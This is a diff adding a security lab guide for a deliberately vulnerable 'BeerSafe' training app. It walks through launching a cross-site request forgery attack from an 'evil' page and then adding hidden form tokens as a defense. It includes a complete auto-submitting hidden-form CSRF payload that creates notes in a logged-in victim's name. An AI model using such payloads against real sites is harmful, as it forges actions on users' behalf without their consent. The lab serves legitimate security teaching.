@@ -1,0 +1,64 @@
+Setting up the lab session
+Before you get started, load the right branch from the repository. Stash your current changes to the branch (git stash). Next, checkout the start_chapter3_csrf branch from the Git repository (git checkout start_chapter3_csrf). Also check for the latest updates (git pull) command.
+Exploiting CSRF attacks
+CSRF attacks exist because the browser automatically attaches the cookies for a domain to any request going to that domain, whether the request originated from within the application or not. This can be problematic if the server is unaware that any page in the browser can start launching requests to its API. CSRF is best understood by actually launching an attack, and seeing what happens.
+In our CSRF attack, we will create a new tasting note in the name of the user. We will be able to provide arbitrary input for the tasting note. To carry out a CSRF attack, we need an application to launch the attack from. We will launch the CSRF attack from the example.com website.
+The first step is to log in to the BeerSafe application, and take a look at how a note is created. Take a look at the form that creates the note, as we will have to mimic such a request during our attack.
+Next, you will need to modify the attack code running on http://example.com/evil/csrf.html. To make developing the exploit easier, the page at that URL loads an iframe, which will contain the actual payload. By editing the csrf-frame.html file in the src/main/resources/static/evil/ folder, you can modify the contents of the page in the iframe.
+Modify the HTML code to include a form, which will be submitted automatically through JavaScript. The form should contain all parameters necessary to create a new tasting note. The code example below gives you an idea of how to construct a hidden form that will automatically be submitted.
+	<form id="csrf" method="POST" 
+	  action="https://beersafe.eu/...">
+		<input type="hidden" name="test" value="test" />
+	</form>
+	<script>
+		document.addEventListener("DOMContentLoaded", function() {
+			document.getElementById("csrf").submit();
+		});
+	</script>
+To execute the attack, follow these steps:
+Make sure the victim is logged in to the BeerSafe application
+In the same browser, open the unrelated page located at http://example.com/evil/csrf.html
+If the attack succeeded, you should see the created note in the iframe
+
+If you have trouble figuring out which fields to submit, inspect the pages of the BeerSafe application to see how the original form is constructed.
+An example payload for the attack is provided below.
+The CSRF attack payload
+<html>
+	<body>
+		<form id="csrf" method="POST" 
+	  action="http://beersafe.eu/CreateNote">
+		<input type="hidden" name="title" value="CSRF" />
+		<input type="hidden" name="content" value="CSRF" />
+		<input type="hidden" name="publicNote" value="true" />
+		<input type="hidden" name="beerid" value="1" />
+	</form>
+	<script>
+		document.addEventListener("DOMContentLoaded", function() {
+			document.getElementById("csrf").submit();
+		});
+	</script>
+	</body>
+</html>
+Defending against CSRF with hidden form tokens
+The most common way to defend against CSRF attacks is embedding a hidden token in the form. The token is also stored in the user's session, and both are compared when the form is submitted. Try to figure out how to enable this defense in the BeerSafe application. Here are a couple of build blocks to get you started.
+The code snippet below shows you how to generate a CSRF token, how to store it in the user's session, and how to expose it as a variable to the JSP page.
+// Generate a CSRF token
+String token = SecureRandomString.generate(8);
+
+// Store it in the user's session
+((Session)request.getAttribute("session")).setAttribute("csrftoken", token);
+
+// Expose it to the JSP page as the "csrf" variable
+request.setAttribute("csrf", token);
+The code snippet below shows you how to include the CSRF token in the form.
+<input type="hidden" name="csrftoken" value="${csrftoken}"/>
+The code snippet below shows you how to get the CSRF token from the incoming request and the user's session.
+// Get the token from the request
+request.getParameter("csrftoken")
+
+// Get the token from the session
+Object validToken = session.getAttribute("csrftoken");
+Use these building blocks to construct a CSRF defense. A correctly implemented defense should allow a legitimate user to create tasting notes but should prevent the attack scenario from before.
+A fully implemented solution is available in the solutions_chapter3_csrf branch. Remember to pull the latest version, in case changes have been made to the code.
+Conclusion
+That concludes this lab session. As you have seen, CSRF attacks can be quite powerful. Unfortunately, many applications are vulnerable to CSRF. The most important reason is that a developer needs to know about CSRF first, and then take explicit action to defend against these attacks. Using hidden form tokens is the best defense in a traditional server-side application like BeerSafe.
